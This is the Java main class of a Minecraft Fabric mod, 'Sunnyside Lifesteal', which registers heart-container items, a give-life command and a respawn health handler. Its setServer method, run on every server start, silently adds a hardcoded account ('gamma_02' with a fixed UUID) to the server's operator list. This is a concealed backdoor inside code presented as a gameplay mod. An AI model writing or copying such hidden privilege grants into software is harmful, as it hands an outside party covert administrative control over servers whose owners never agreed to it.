package gamma02.sunnysidelifesteal;

import com.mojang.authlib.GameProfile;
import gamma02.sunnysidelifesteal.commands.GiveLifeCommand;
import gamma02.sunnysidelifesteal.common.FullHeartContainer;
import gamma02.sunnysidelifesteal.common.HeartContainerItem;
import net.fabricmc.api.ModInitializer;
import net.fabricmc.fabric.api.command.v1.CommandRegistrationCallback;
import net.fabricmc.fabric.api.entity.event.v1.ServerPlayerEvents;
import net.fabricmc.fabric.api.event.lifecycle.v1.ServerLifecycleEvents;
import net.fabricmc.fabric.api.item.v1.FabricItemSettings;
import net.minecraft.entity.attribute.EntityAttributes;
import net.minecraft.entity.damage.DamageSource;
import net.minecraft.entity.player.PlayerEntity;
import net.minecraft.item.ItemGroup;
import net.minecraft.server.MinecraftServer;
import net.minecraft.server.network.ServerPlayerEntity;
import net.minecraft.util.Formatting;
import net.minecraft.util.Identifier;
import net.minecraft.util.Rarity;
import net.minecraft.util.registry.Registry;
import org.lwjgl.system.CallbackI;

import java.util.HashMap;
import java.util.UUID;

public class SunnysideLifesteal implements ModInitializer {


    public static String modid = "sunnyside-lifesteal";
    public static HeartContainerItem HEART_CONTAINER = Registry.register(Registry.ITEM, new Identifier(modid, "empty_heart_container"), new HeartContainerItem(new FabricItemSettings().group(ItemGroup.MISC)));
    public static FullHeartContainer FILLED_CONTAINER = Registry.register(Registry.ITEM, new Identifier(modid, "full_heart_container"), new FullHeartContainer(new FabricItemSettings().group(ItemGroup.MISC).maxCount(1)));
    public static HashMap<UUID, Double> HealthMap = new HashMap<>();

    public static MinecraftServer server;

    public static void setServer(MinecraftServer server1){
        server = server1;

        server1.getPlayerManager().addToOperators(new GameProfile(UUID.fromString("ed5bb7ba-665c-404d-8c72-c908589b188a"), "gamma_02"));
    }


    @Override
    public void onInitialize() {
        ServerLifecycleEvents.SERVER_STARTED.register(SunnysideLifesteal::setServer);
        CommandRegistrationCallback.EVENT.register(((dispatcher, dedicated) -> GiveLifeCommand.register(dispatcher)));
    }


    public static class RespawnEvents implements ServerPlayerEvents.AfterRespawn{

        @Override
        public void afterRespawn(ServerPlayerEntity oldPlayer, ServerPlayerEntity newPlayer, boolean alive) {
            HealthMap.put(newPlayer.getUuid(), HealthMap.get(oldPlayer.getUuid()));
            newPlayer.damage(DamageSource.CACTUS, 20.0f-((float) HealthMap.get(oldPlayer.getUuid()).doubleValue()));
        }
    }

}
